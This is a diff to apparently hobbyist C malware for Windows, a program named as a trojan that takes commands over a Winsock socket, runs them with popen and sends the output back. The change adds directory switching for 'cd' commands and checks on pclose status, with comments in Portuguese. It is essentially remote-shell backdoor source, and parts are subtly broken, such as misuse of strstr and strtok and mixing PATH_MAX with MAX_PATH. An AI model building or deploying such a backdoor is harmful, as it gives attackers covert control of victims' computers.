@@ -1,8 +1,11 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
+#include <unistd.h>
+#include <string.h>
 
 #define B 1024
+#define DIR 256
 #define True 1
 
 int trojanExec(int s);
@@ -37,10 +40,13 @@ int main(){
 		return 1;
 	}
 
-	char recvbuf[B];
+	char recvbuf[B], cwd[DIR];
 	char *shell = "$>";
+	char *cd;
 	FILE *fp;
 	char path[MAX_PATH];
+	int status;
+	char *aux;
 
 	while (True){
 
@@ -56,12 +62,46 @@ int main(){
 			return 2;
 		}
 
-		fp = popen(recvbuf, "rb");
+			if ((strstr(recvbuf, "cd")-recvbuf) == 0){
+				cd = strtok(strchr(recvbuf, 32), " ");
 
-		while (fgets(path, PATH_MAX, fp) != NULL){
-			erro = send(s, path, (int)strlen(path), 0);
-		}
+				if ((aux=strchr(cd, '\n')) != NULL){
+				    *aux = '\0';
+				}
+				
+				if (chdir(cd) != 0){
+					perror("chdir() error()");
+				}
+				else {
+					if (getcwd(cwd, sizeof(cwd)) == NULL){
+						perror("getcwd() error");
+					}
+					else {
+						printf("current working directory is: %s\n", cwd);
+						//erro = send(s, cwd, (int)strlen(cwd), 0);
+					}
+				}
+			}
+
+			fp = popen(recvbuf, "r");
+
+			while (fgets(path, PATH_MAX, fp) != NULL){
+				erro = send(s, path, (int)strlen(path), 0);
+			}
+
+			status = pclose (fp);
+
+			printf("status : %d\n", status);
+
+			if (status == -1) {
+			    printf("Erro relatado por pclose ()\n");
+			    return 1;
+			} else {
+			    /* Use macros descritas em wait () para inspecionar 'status' em ordem
+			       determinar o sucesso / falha do comando executado por popen () */
+		    }
 	}
+
 
 closesocket(s);
 
